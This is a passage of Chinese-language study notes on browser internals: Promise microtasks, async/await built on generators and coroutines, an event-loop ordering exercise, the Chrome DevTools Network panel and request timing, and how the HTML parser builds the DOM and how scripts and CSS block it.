demo.then(onResolve); 首先执行 new Promise 时，Promise 的构造函数会被执行，然后在 executor 中执行了 resolve，执行 resolve 函数，会触发 demo.then 设置的回调函数 onResolve，所以可以推测，resolve 函数内部调用了通过 demo.then 设置的 onResolve 函数。\n不过这里需要注意一下，由于 Promise 采用了回调函数延迟绑定技术，所以在执行 resolve 函数的时候，回调函数还没有绑定，那么只能推迟回调函数的执行。\n1、Promise 中为什么要引入微任务？\n由于 promise 采用.then 延时绑定回调机制，而 new Promise 时又需要直接执行 promise 中的方法，即发生了先执行方法后添加回调的过程，此时需等待 then 方法绑定两个回调后才能继续执行方法回调，便可将回调添加到当前 js 调用栈中执行结束后的任务队列中，由于宏任务较多容易堵塞，则采用了微任务\n2、Promise 中是如何实现回调函数返回值穿透的？\n首先 Promise 的执行结果保存在 promise 的 data 变量中，然后是.then 方法返回值为使用 resolved 或 rejected 回调方法新建的一个 promise 对象，即例如成功则返回 new Promise（resolved），将前一个 promise 的 data 值赋给新建的 promise\n3、Promise 出错后，是怎么通过“冒泡”传递给最后那个捕获？\npromise 内部有 resolved和 rejected变量保存成功和失败的回调，进入.then（resolved，rejected）时会判断 rejected 参数是否为函数，若是函数，错误时使用 rejected 处理错误；若不是，则错误时直接 throw 错误，一直传递到最后的捕获，若最后没有被捕获，则会报错。可通过监听 unhandledrejection 事件捕获未处理的 promise 错误\n问：异步 AJAX 请求是宏任务吧？Promise 是微任务，那么用 Promise 进行的异步 Ajax 调用时宏任务还是微任务？\n答： ajax 就是 xmlhttprequest，必然是宏任务！ 准确地说，Promise 在执行 resolve 或者 reject 时，触发微任务入队，所以在 Promise 的 executor 函数中调用 xmlhttprequest 会触发宏任务。 如果 xmlhttprequest 请求成功了，通过 resolve 触发微任务 如果 xmlhttprequest 请求失败了，通过 reject 触发微任务\nasync/await 使用 Promise 能解决回调地狱问题，但是这种方式充满了 Promise 的 then() 方法，如果处理流程比较复杂的话，那么整段代码将充斥着 then，语义化不明显，代码不能很好地表示执行流程。\n场景：先请求 A 内容，等返回信息之后，再请求 B 内容，fetch 被定义在 window 对象中，可以用它来发起对远程资源的请求，该方法返回的是一个 Promise 对象，fetch 是浏览器原生支持的，并有没利用 XMLHttpRequest 来封装。\n1 2 3 4 5 6 7 8 9 10 11 fetch(\u0026#34;https://www.geekbang.org\u0026#34;) .then((response) =\u0026gt; { console.log(response); return fetch(\u0026#34;https://www.geekbang.org/test\u0026#34;); }) .then((response) =\u0026gt; { console.log(response); }) .catch((error) =\u0026gt; { console.log(error); }); 虽然整个请求流程已经线性化了，但是代码里面包含了大量的 then 函数。\n基于这个原因，ES7 引入了 async/await，提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力，并且使得代码逻辑更加清晰。（使用同步编码的方式编写异步逻辑）\n1 2 3 4 5 6 7 8 9 10 11 12 13 async function foo() { try { let response1 = await fetch(\u0026#34;https://www.geekbang.org\u0026#34;); console.log(\u0026#34;response1\u0026#34;); console.log(response1); let response2 = await fetch(\u0026#34;https://www.geekbang.org/test\u0026#34;); console.log(\u0026#34;response2\u0026#34;); console.log(response2); } catch (err) { console.error(err); } } foo(); 整个异步处理的逻辑都是使用同步代码的方式来实现的，而且还支持 try catch 来捕获异常，这就是完全在写同步代码，所以是非常符合人的线性思维的。\n习惯了异步回调的编程思维，对于这种采用同步代码实现异步逻辑的方式，需要一个转换的过程。\n**JavaScript 引擎是如何实现 async/await **\n生成器（Generator）是如何工作的， Generator 的底层实现机制——协程（Coroutine）；因为 async/await 使用了 Generator 和 Promise 两种技术，所以紧接着我们就通过 Generator 和 Promise 来分析 async/await 到底是如何以同步的方式来编写异步代码的。\n生成器的工作原理，生成器底层基于——协程（Coroutine）来实现。\nasync/await 基于 Generator 和 Promise。\n什么是生成器函数？\n生成器函数是一个带星号函数，而且是可以暂停执行和恢复执行的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function* genDemo() { console.log(\u0026#34; 开始执行第一段 \u0026#34;); yield \u0026#34;generator 2\u0026#34;; console.log(\u0026#34; 开始执行第二段 \u0026#34;); yield \u0026#34;generator 2\u0026#34;; console.log(\u0026#34; 开始执行第三段 \u0026#34;); yield \u0026#34;generator 2\u0026#34;; console.log(\u0026#34; 执行结束 \u0026#34;); return \u0026#34;generator 2\u0026#34;; } console.log(\u0026#34;main 0\u0026#34;); let gen = genDemo(); console.log(gen.next().value); console.log(\u0026#34;main 1\u0026#34;); console.log(gen.next().value); console.log(\u0026#34;main 2\u0026#34;); console.log(gen.next().value); console.log(\u0026#34;main 3\u0026#34;); console.log(gen.next().value); console.log(\u0026#34;main 4\u0026#34;); 函数 genDemo 并不是一次执行完的，全局代码(父协程)和 genDemo 函数（子协程）交替执行。其实这就是生成器函数的特性，可以暂停执行，也可以恢复执行。生成器函数的具体使用方式：\n在生成器函数内部执行一段代码，如果遇到 yield 关键字，那么 JavaScript 引擎线程将返回关键字后面的内容给外部（父协程），并暂停该函数的执行。\n外部函数（父协程）可以通过 next 方法恢复生成器函数（指定的子协程）的执行。\nJavaScript 引擎 V8 是如何实现一个函数的暂停和恢复的\n要搞懂函数为何能暂停和恢复，那首先要了解协程的概念。协程是一种比线程更加轻量级的存在。你可以把协程看成是跑在线程上的任务，一个线程上可以存在多个协程，但是在线程上同时只能执行一个协程，比如当前执行的是 A 协程，要启动 B 协程，那么 A 协程就需要将主线程的控制权交给 B 协程，这就体现在 A 协程暂停执行，B 协程恢复执行；同样，也可以从 B 协程中启动 A 协程。通常，如果从 A 协程启动 B 协程，我们就把 A 协程称为 B 协程的父协程。\n**正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。**最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。\n结合上面那段代码的执行过程，画出了下面的“协程执行流程图”：\n从图中可以看出来协程的四点规则：\n通过调用生成器函数 genDemo 来创建一个协程 gen，创建之后，gen 协程并没有立即执行。 要让 gen 协程执行，需要通过调用 gen.next。 当协程正在执行的时候，可以通过 yield 关键字来暂停 gen 协程的执行，并返回主要信息给父协程。 如果协程在执行期间，遇到了 return 关键字，那么 JavaScript 引擎会结束当前协程，并将 return 后面的内容返回给父协程。 父协程有自己的调用栈，gen 协程也有自己的调用栈，当 gen 协程通过 yield 把控制权交给父协程时，V8 是如何切换到父协程的调用栈？当父协程通过 gen.next 恢复 gen 协程时，又是如何切换 gen 协程的调用栈？\n要搞清楚上面的问题，需要关注以下两点内容。\n第一点：gen 协程和父协程是在主线程上交互执行的，并不是并发执行的，它们之前的切换是通过 yield 和 gen.next 来配合完成的。\n第二点：当在 gen 协程中调用了 yield 方法时，JavaScript 引擎会保存 gen 协程当前的调用栈信息，并恢复父协程的调用栈信息。同样，当在父协程中执行 gen.next 时，JavaScript 引擎会保存父协程的调用栈信息，并恢复 gen 协程的调用栈信息。\n父协程和 gen 协程是如何切换调用栈的，可以参考下图：\n在 JavaScript 中，生成器就是协程的一种实现方式，那么接下来，使用生成器和 Promise 来改造开头的那段 Promise 代码。改造后的代码如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 //foo 函数 function* foo() { let response1 = yield fetch(\u0026#34;https://www.geekbang.org\u0026#34;); console.log(\u0026#34;response1\u0026#34;); console.log(response1); let response2 = yield fetch(\u0026#34;https://www.geekbang.org/test\u0026#34;); console.log(\u0026#34;response2\u0026#34;); console.log(response2); } // 执行 foo 函数的代码 let gen = foo(); function getGenPromise(gen) { return gen.next().value; } getGenPromise(gen) .then((response) =\u0026gt; { console.log(\u0026#34;response1\u0026#34;); console.log(response); return getGenPromise(gen); }) .then((response) =\u0026gt; { console.log(\u0026#34;response2\u0026#34;); console.log(response); }); 从图中可以看到，foo 函数是一个生成器函数，在 foo 函数里面实现了用同步代码形式来实现异步操作；但是在 foo 函数外部，我们还需要写一段执行 foo 函数的代码，如上述代码的后半部分所示，那下面我们就来分析下这段代码是如何工作的。\n首先执行的是let gen = foo()，创建了 gen 协程。 然后在父协程中通过执行 gen.next 把主线程的控制权交给 gen 协程。 gen 协程获取到主线程的控制权后，就调用 fetch 函数创建了一个 Promise 对象 response1，然后通过 yield 暂停 gen 协程的执行，并将 response1 返回给父协程。 父协程恢复执行后，调用 response1.then 方法等待请求结果。 等通过 fetch 发起的请求完成之后，会调用 then 中的回调函数，then 中的回调函数拿到结果之后，通过调用 gen.next 放弃主线程的控制权，将控制权交 gen 协程继续执行下个请求。 以上就是协程和 Promise 相互配合执行的一个大致流程。不过通常，我们把执行生成器的代码封装成一个函数，并把这个执行生成器代码的函数称为执行器（可参考著名的 co 框架），如下面这种方式：\n1 2 3 4 5 6 7 8 9 function* foo() { let response1 = yield fetch(\u0026#34;https://www.geekbang.org\u0026#34;); console.log(\u0026#34;response1\u0026#34;); console.log(response1); let response2 = yield fetch(\u0026#34;https://www.geekbang.org/test\u0026#34;); console.log(\u0026#34;response2\u0026#34;); console.log(response2); } co(foo()); 通过使用生成器配合执行器，就能实现使用同步的方式写出异步代码了，这样也大大加强了代码的可读性。\nasync/await\nasync/await 技术背后就是 Promise 和生成器应用，往低层说就是微任务和协程应用。要搞清楚 async 和 await 的工作原理，我们就得对 async 和 await 分开分析。\nasync\nasync 是一个通过异步执行并隐式返回 Promise 作为结果的函数。\n1 2 3 4 async function foo() { return 2; } console.log(foo()); // Promise {\u0026lt;resolved\u0026gt;: 2} await\n1 2 3 4 5 6 7 8 9 async function foo() { console.log(1); let a = await 100; console.log(a); console.log(2); } console.log(0); foo(); console.log(3); 判断出打印出来的内容是什么吗？这得先来分析 async 结合 await 到底会发生什么。在详细介绍之前，我们先站在协程的视角来看看这段代码的整体执行流程图：\n结合上图，我们来一起分析下 async/await 的执行流程。\n首先，执行console.log(0)这个语句，打印出来 0。\n紧接着就是执行 foo 函数，由于 foo 函数是被 async 标记过的，所以当进入该函数的时候，JavaScript 引擎会保存当前的调用栈等信息，然后执行 foo 函数中的console.log(1)语句，并打印出 1。\n接下来就执行到 foo 函数中的await 100这个语句了，这里是我们分析的重点，因为在执行await 100这个语句时，JavaScript 引擎在背后为我们默默做了太多的事情，那么下面我们就把这个语句拆开，来看看 JavaScript 到底都做了哪些事情。\n当执行到await 100时，会默认创建一个 Promise 对象，代码如下所示：\n1 2 3 let promise_ = new Promise((resolve,reject){ resolve(100) }) 在这个 promise_ 对象创建的过程中，我们可以看到在 executor 函数中调用了 resolve 函数，JavaScript 引擎会将该任务提交给微任务队列。\n然后 JavaScript 引擎会暂停当前协程的执行，将主线程的控制权转交给父协程执行，同时会将 promise_ 对象返回给父协程。\n主线程的控制权已经交给父协程了，这时候父协程要做的一件事是调用 promise_.then 来监控 promise 状态的改变。\n接下来继续执行父协程的流程，这里我们执行console.log(3)，并打印出来 3。随后父协程将执行结束，在结束之前，会进入微任务的检查点，然后执行微任务队列，微任务队列中有resolve(100)的任务等待执行，执行到这里的时候，会触发 promise_.then 中的回调函数，如下所示：\n1 2 3 4 promise_.then((value) =\u0026gt; { // 回调函数被激活后 // 将主线程控制权交给 foo 协程，并将 vaule 值传给协程 }); 该回调函数被激活以后，会将主线程的控制权交给 foo 函数的协程，并同时将 value 值传给该协程。\nfoo 协程激活之后，会把刚才的 value 值赋给了变量 a，然后 foo 协程继续执行后续语句，执行完成之后，将控制权归还给父协程。\n以上就是 await/async 的执行流程。正是因为 async 和 await 在背后为我们做了大量的工作，所以我们才能用同步的方式写出异步代码来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 async function foo() { console.log(\u0026#34;foo\u0026#34;); } async function bar() { console.log(\u0026#34;bar start\u0026#34;); await foo(); console.log(\u0026#34;bar end\u0026#34;); } console.log(\u0026#34;script start\u0026#34;); setTimeout(function () { console.log(\u0026#34;setTimeout\u0026#34;); }, 0); bar(); new Promise(function (resolve) { console.log(\u0026#34;promise executor\u0026#34;); resolve(); }).then(function () { console.log(\u0026#34;promise then\u0026#34;); }); console.log(\u0026#34;script end\u0026#34;); 答：\n1.首先执行 console.log(\u0026lsquo;script start\u0026rsquo;);打印出 script start\n2.接着遇到定时器，创建一个新任务，放在延迟队列中\n3.紧接着执行 bar 函数，由于 bar 函数被 async 标记的，所以进入该函数时，JS 引擎会保存当前调用栈等信息，然后执行 bar 函数中的 console.log(\u0026lsquo;bar start\u0026rsquo;);语句，打印 bar start。\n4.接下来执行到 bar 函数中的 await foo();语句，执行 foo 函数，也由于 foo 函数被 async 标记的，所以进入该函数时，JS 引擎会保存当前调用栈等信息，然后执行 foo 函数中的 console.log(\u0026lsquo;foo\u0026rsquo;);语句，打印 foo。\n5.执行到 await foo()时，会默认创建一个 Promise 对象\n6.在创建 Promise 对象过程中，调用了 resolve()函数，且 JS 引擎将该任务交给微任务队列\n7.然后 JS 引擎会暂停当前协程的执行，将主线程的控制权交给父协程，同时将创建的 Promise 对象返回给父协程\n8.主线程的控制权交给父协程后，父协程就调用该 Promise 对象的 then()方法监控该 Promise 对象的状态改变\n9.接下来继续父协程的流程，执行 new Promise()，打印输出 promise executor，其中调用了 resolve 函数，JS 引擎将该任务添加到微任务队列队尾\n10.继续执行父协程上的流程，执行 console.log(\u0026lsquo;script end\u0026rsquo;);，打印出来 script end\n11.随后父协程将执行结束，在结束前，会进入微任务检查点，然后执行微任务队列，微任务队列中有两个微任务等待执行，先执行第一个微任务，触发第一个 promise.then()中的回调函数，将主线程的控制权交给 bar 函数的协程，bar 函数的协程激活后，继续执行后续语句，执行 console.log(\u0026lsquo;bar end\u0026rsquo;);，打印输出 bar end\n12.bar 函数协程执行完成后，执行微任务队列中的第二个微任务，触发第二个 promise.then()中的回调函数，该回调函数被激活后，执行 console.log(\u0026lsquo;promise then\u0026rsquo;);，打印输出 promise then\n13.执行完之后，将控制权归还给主线程，当前任务执行完毕，取出延迟队列中的任务，执行 console.log(\u0026lsquo;setTimeout\u0026rsquo;);打印输出 setTimeout。\n故：最终输出顺序是：script start =\u0026gt; bar start =\u0026gt; foo =\u0026gt; promise executor =\u0026gt; script end =\u0026gt; bar end =\u0026gt; promise then =\u0026gt; setTimeout\n浏览器的渲染进程中的主线程的页面任务循环系统和 JavaScript 引擎线程中的事件循环系统是不同的概念。\n页面循环系统包括的过程包括：DOM 解析，CSS 解析，样式计算，布局，分层，JavaScript 执行等过程。\nChrome 开发者工具 Chrome 开发者工具（简称 DevTools）是一组工具，用于网页制作和调试，内嵌于 Chrome 浏览器中。\n网络面板\n与性能相关的有：网络面板、Performance 面板、内存面板等\n与调试页面相关的有：Elements 面板、Sources 面板、Console 面板等\nF12 快速打开开发者工具。\n它一共包含了 10 个功能面板，包括了 Elements、Console、Sources、NetWork、Performance、Memory、Application、Security、Audits 和 Layers。\nElement 面板：查看 DOM 结构，编辑 CSS 样式，调试页面的布局和设计页面\nConsole 面板：类似 Javascript Shell，可以执行 js，console 等输出语句或者通过代码和页面进行交互\nSources 面板：\n查看 web 应用加载的所有文件 编辑 CSS 和 JS 文件内容 将打乱的 CSS 和 JS 文件格式化 支持 JS 的调试功能 设置工作区，将改变后的文件保存到本地文件夹中 NetWork 面板：展示页面中所有的请求内容列表，能查看每一项请求的请求，响应报文，时间线以及网络请求中的瀑布图等\nPerformance 面板：记录和查看 web 应用生命周期内的各种事件，并用来分析在执行过程中一些影响性能的点\nMemory 面板：查看允许过程中 JS 占用堆内存的情况，追踪是否存在内存泄漏的情况\nApplication 面板：查看 web 应用的数据存储情况，PWA 的基础数据。indexDB，WebSQL，本地和会话存储，Cookie，应用程序缓存，图像，字体和样式表等\nSecurity 面板：显示当前页面的一些基础的安全信息\nAudits 面板：对当前页面进行网络利用情况，网页性能方面的诊断，并给出一些优化建议\nLayers 面板：展示一些渲染过程中分层的基础信息\n网络面板 网络面板由控制器、过滤器、抓图信息、时间线、详细列表和下载信息概要这 6 个区域构成（如下图所示）。\n1. 控制器 红色圆点的按钮，表示“开始 / 暂停抓包”。\n“全局搜索”按钮，可以在所有下载资源中搜索相关内容，还可以快速定位到某几个想要的文件上。\nDisable cache，即“禁止从 Cache 中加载资源”的功能，它在调试 Web 应用的时候非常有用，因为开启了 Cache 会影响到网络性能测试的结果。\nOnline 按钮，是“模拟 2G/3G”功能，它可以限制带宽，模拟弱网情况下页面的展现情况，然后你就可以根据实际展示情况来动态调整策略，以便让 Web 应用更加适用于这些弱网。\n2. 过滤器 主要就是起过滤功能。有时候一个页面有太多内容在详细列表区域中展示，而可能只想查看 JavaScript 文件或者 CSS 文件，这时候就可以通过过滤器模块来筛选想要的文件类型。\n3. 抓图信息 抓图信息区域，可以用来分析用户等待页面加载资源的时间内所看到页面变化，分析用户实际的体验情况。比如，如果页面加载 1 秒多之后屏幕截图还是白屏状态，这时候就需要分析是网络还是代码的问题了。（勾选面板上的“Capture screenshots”即可启用屏幕截图。）\n4. 时间线 时间线，主要用来展示 HTTP、HTTPS、WebSocket 加载的状态和时间的一个关系，用于直观感受页面的加载过程。**如果是多条竖线堆叠在一起，那说明这些资源被同时被加载。**至于具体到每个文件的加载信息，还需要用到下面要讲的详细列表。\n5. 详细列表 **它详细记录了每个资源从发起请求到完成请求这中间所有过程的状态，以及最终请求完成的数据信息。**通过该列表，能很容易地去诊断一些网络问题。\n6. 下载信息概要 下载信息概要中，要重点关注下 DOMContentLoaded 和 Load 两个事件，以及这两个事件的完成时间。\nDOMContentLoaded，这个事件发生后，说明页面已经构建好 DOM 了，这意味着构建 DOM 所需要的 HTML 文件、JavaScript 文件、CSS 文件都已经下载完成了。 Load，说明浏览器已经加载了所有的资源（图像、样式表等）。 通过下载信息概要面板，可以查看触发这两个事件所花费的时间。\n网络面板详细列表 1. 列表的属性 列表的属性比较多，比如 Name、Status、Type、Initiator 等。可以通过点击右键的下拉菜单来添加其他属性。\n可以按照列表的属性来给列表排序，默认情况下，列表是按请求发起的时间来排序的，最早发起请求的资源在顶部。当然也可以按照返回状态码、请求类型、请求时长、内容大小等基础属性排序，只需点击相应属性即可。\n2. 详细信息 如果选中详细列表中的一项，右边就会出现该项的详细信息，如下所示：\n可以在此查看请求列表中任意一项的请求行和请求头信息，还可以查看响应行、响应头和响应体。然后可以根据这些查看的信息来判断业务逻辑是否正确。\n3. 单个资源的时间线 单个资源请求时间线涉及具体的 HTTP 请求流程。\n时间线列表中是如何表示出这个流程的：\n第一个是 Queuing，也就是排队的意思，当浏览器发起一个请求的时候，会有很多原因导致该请求不能被立即执行，而是需要排队等待。导致请求处于排队状态的原因有很多。\n首先，页面中的资源是有优先级的，比如 CSS、HTML、JavaScript 等都是页面中的核心文件，所以优先级最高；而图片、视频、音频这类资源就不是核心资源，优先级就比较低。通常当后者遇到前者时，就需要“让路”，进入待排队状态。 其次，浏览器会为每个域名最多维护 6 个 TCP 连接（HTTP1.1 中），如果发起一个 HTTP 请求时，这 6 个 TCP 连接都处于忙碌状态，那么这个请求就会处于排队状态。 最后，网络进程在为数据分配磁盘空间时，新的 HTTP 请求也需要短暂地等待磁盘分配结束。 等待排队完成之后，就要进入发起连接的状态了。不过在发起连接之前，还有一些原因可能导致连接过程被推迟，这个推迟就表现在面板中的Stalled上，它表示停滞的意思。\n这里需要额外说明的是，如果使用了代理服务器，还会增加一个Proxy Negotiation阶段，也就是代理协商阶段，它表示代理服务器连接协商所用的时间，不过在上图中没有体现出来，因为这里没有使用代理服务器。\n接下来，就到了Initial connection/SSL 阶段了，也就是和服务器建立连接的阶段，这包括了建立 TCP 连接所花费的时间；不过如果使用了 HTTPS 协议，那么还需要一个额外的 SSL 握手时间，这个过程主要是用来协商一些加密信息的。\n和服务器建立好连接之后，网络进程会准备请求数据，并将其发送给网络，这就是Request sent 阶段。通常这个阶段非常快，因为只需要把浏览器缓冲区的数据发送出去就结束了，并不需要判断服务器是否接收到了，所以这个时间通常不到 1 毫秒。\n数据发送出去了，接下来就是等待接收服务器第一个字节的数据，这个阶段称为 Waiting (TTFB)，通常也称为“第一字节时间”。 TTFB 是反映服务端响应速度的重要指标，对服务器来说，TTFB 时间越短，就说明服务器响应越快。\n接收到第一个字节之后，进入陆续接收完整数据的阶段，也就是Content Download 阶段，这意味着从第一字节时间到接收到全部响应数据所用的时间。\n优化时间线上耗时项 可以根据这个请求的时间线来实现相关的优化操作。\n1. 排队（Queuing）时间过久 排队时间过久，大概率是由浏览器为每个域名最多维护 6 个连接导致的。那么基于这个原因，就可以让 1 个站点下面的资源放在多个域名下面，比如放到 3 个域名下面，这样就可以同时支持 18 个连接了，这种方案称为域名分片技术。除了域名分片技术外，还建议你把站点升级到 HTTP2，因为 HTTP2 已经没有每个域名最多维护 6 个 TCP 连接的限制。\n2. 第一字节时间（TTFB）时间过久 这可能的原因有如下：\n服务器生成页面数据的时间过久。对于动态网页来说，服务器收到用户打开一个页面的请求时，首先要从数据库中读取该页面需要的数据，然后把这些数据传入到模板中，模板渲染后，再返回给用户，服务器在处理这些数据的耗时导致。 网络的原因。比如使用了低带宽的服务器，或者本来用的是电信的服务器，可联通的网络用户要来访问你的服务器，这样也会拖慢网速（跨运营商访问服务器）。 发送请求头时带上了多余的用户信息。比如一些不必要的 Cookie 信息，服务器接收到这些 Cookie 信息之后可能需要对每一项都做处理，这样就加大了服务器的处理时长。 对于这三种问题，要有针对性地出一些解决方案。面对第一种服务器的问题，可以想办法去提高服务器的处理速度，比如通过增加各种缓存的技术；针对第二种网络问题，可以使用 CDN 来缓存一些静态文件；至于第三种，在发送请求时就去尽可能地减少一些不必要的 Cookie 数据信息。\n3. Content Download 时间过久 如果单个请求的 Content Download 花费了大量时间，有可能是字节数太多的原因导致的。可以减少文件大小，比如压缩、去掉源码中不必要的注释等方法。\n问题：你可以结合网络面板和 Performance 面板来分析一个 Web 应用的性能瓶颈（比如https://www.12306.cn ）\nPerformance 面板 自行上网总结\nDOM 树 什么是 DOM 网络进程传给渲染进程的 HTML 文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。DOM 是对 HTML 文档结构化的表述。在渲染引擎中，DOM 有三个层面的作用。\nDOM 是描述 HTML 的一种内部基础数据结构（树） DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容 DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒绝 DOM 树是怎么生成的 在渲染引擎内部，有一个叫**HTML 解析器（HTMLParser）**的模块，它的职责就是负责将 HTML 字节流转换为 DOM 结构。\n问题：HTML 解析器是等整个 HTML 文档加载完成之后开始解析的，还是随着 HTML 文档边加载边解析的？\n答：HTML 解析器并不是等整个文档加载完成之后再解析的，而是网络进程加载了多少数据，HTML 解析器便解析多少数据。\n细节：网络进程接收到响应头之后，将响应头，行信息传输给浏览器进程，浏览器进程会根据响应头中的 content-type 字段来判断文件的类型，比如 content-type 的值是“text/html”，那么浏览器进程就会判断这是一个 HTML 类型的文件，然后为该请求选择或者创建一个渲染进程。并‘提交文档’给渲染进程，渲染进程准备好之后，网络进程和渲染进程之间会建立一个共享数据的管道，网络进程接收到数据后就往这个管道里面放，而渲染进程则从管道的另外一端不断地读取数据，并同时将读取的数据给 HTML 解析器。\nHTML 解析器是怎么工作的。字节流是如何转换为 DOM 的？\n字节流转换为 DOM 需要三个阶段\n第一个阶段，通过分词器将字节流转换为 Token。\nV8 编译 JavaScript 过程中的第一步是做词法分析，将 JavaScript 先分解为一个个 Token。解析 HTML 也是一样的，需要通过分词器先将字节流转换为一个个 Token，分为 Tag Token 和文本 Token。上述 HTML 代码通过词法分析生成的 Token 如下所示：\n由图可以看出，Tag Token 又分 StartTag 和 EndTag，分别对应图中的蓝色和红色块，文本 Token 对应的绿色块。\n后续的第二个和第三个阶段是同步进行的，需要将 Token 解析为 DOM 节点，并将 DOM 节点添加到 DOM 树中。\nHTML 解析器维护了一个Token 栈结构，该 Token 栈主要用来计算节点之间的父子关系，在第一个阶段中生成的 Token 会被按照顺序压到这个栈中。具体的处理规则如下所示：\n如果压入到栈中的是StartTag Token，HTML 解析器会为该 Token 创建一个 DOM 节点，然后将该节点加入到 DOM 树中，它的父节点就是栈中相邻的那个元素生成的节点。 如果分词器解析出来是文本 Token，那么会生成一个文本节点，然后将该节点加入到 DOM 树中，文本 Token 是不需要压入到栈中，它的父节点就是当前栈顶 Token 所对应的 DOM 节点。 如果分词器解析出来的是EndTag 标签，比如是 EndTag div，HTML 解析器会查看 Token 栈顶的元素是否是 StarTag div，如果是，就将 StartTag div 从栈中弹出，表示该 div 元素解析完成。 通过分词器产生的新 Token 就这样不停地压栈和出栈，整个解析过程就这样一直持续下去，直到分词器将所有字节流分词完成。\n为了更加直观地理解整个过程，下面结合一段 HTML 代码（如下），来一步步分析 DOM 树的生成过程。\n1 2 3 4 5 6 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;1\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;test\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这段代码以字节流的形式传给了 HTML 解析器，经过分词器处理，解析出来的第一个 Token 是 StartTag html，解析出来的 Token 会被压入到栈中，并同时创建一个 html 的 DOM 节点，将其加入到 DOM 树中。\n这里需要补充说明下，HTML 解析器开始工作时，会默认创建了一个根为 document 的空 DOM 结构，同时会将一个 StartTag document 的 Token 压入栈底。然后经过分词器解析出来的第一个 StartTag html Token 会被压入到栈中，并创建一个 html 的 DOM 节点，添加到 document 上，如下图所示：\n然后按照同样的流程解析出来 StartTag body 和 StartTag div，其 Token 栈和 DOM 的状态如下图所示：\n接下来解析出来的是第一个 div 的文本 Token，渲染引擎会为该 Token 创建一个文本节点，并将该 Token 添加到 DOM 中，它的父节点就是当前 Token 栈顶元素对应的节点，如下图所示：\n再接下来，分词器解析出来第一个 EndTag div，这时候 HTML 解析器会去判断当前栈顶的元素是否是 StartTag div，如果是则从栈顶弹出 StartTag div，如下图所示：\n按照同样的规则，一路解析，最终结果如下图所示：\nHTML 源文件中，实际上会有 css、js、图片、音视频文件等。\nJS 影响 DOM 生成 1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;1\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; let div1 = document.getElementsByTagName(\u0026#34;div\u0026#34;)[0]; div1.innerText = \u0026#34;time.geekbang\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;test\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;script\u0026gt;标签之前，所有的解析流程还是和之前介绍的一样，但是解析到\u0026lt;script\u0026gt;标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。\n通过前面 DOM 生成流程分析，已经知道当解析到 script 脚本标签时，其 DOM 树结构如下所示：\n这时候 HTML 解析器暂停工作，JavaScript 引擎介入，并执行 script 标签中的这段脚本，因为这段 JavaScript 脚本修改了 DOM 中第一个 div 中的内容，所以执行这段脚本之后，div 节点内容已经修改为 time.geekbang 了。脚本执行完成之后，HTML 解析器恢复解析过程，继续解析后续的内容，直至生成最终的 DOM。\n除了在页面中直接内嵌 JavaScript 脚本之外，还通常需要在页面中引入 JavaScript 文件。\nHTML 解析器执行到引入外部 JavaScript 文件的 script 标签时，暂停整个 DOM 的解析，执行 JavaScript 代码，不过这里执行 JavaScript 时，需要先下载这段 JavaScript 代码。这里需要重点关注下载环境，因为JavaScript 文件的下载过程会阻塞 DOM 解析，而通常下载又是非常耗时的，会受到网络环境、JavaScript 文件大小等因素的影响。\n不过 Chrome 浏览器做了很多优化，其中一个主要的优化是预解析操作。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。\n再回到 DOM 解析上，引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码。\n使用 async 标志的脚本文件一旦加载完成，会立即执行；而使用了 defer 标记的脚本文件，需要在 DOMContentLoaded 事件之前执行。\n1 2 3 4 //theme.css div { color: blue; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style src=\u0026#34;theme.css\u0026#34;\u0026gt;\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;1\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; let div1 = document.getElementsByTagName(\u0026#34;div\u0026#34;)[0]; div1.innerText = \u0026#34;time.geekbang\u0026#34;; // 需要 DOM div1.style.color = \u0026#34;red\u0026#34;; // 需要 CSSOM \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;test\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 该示例中，JavaScript 代码出现了 div1.style.color = ‘red' 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。\n而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM 的，所以渲染引擎在遇到 JavaScript 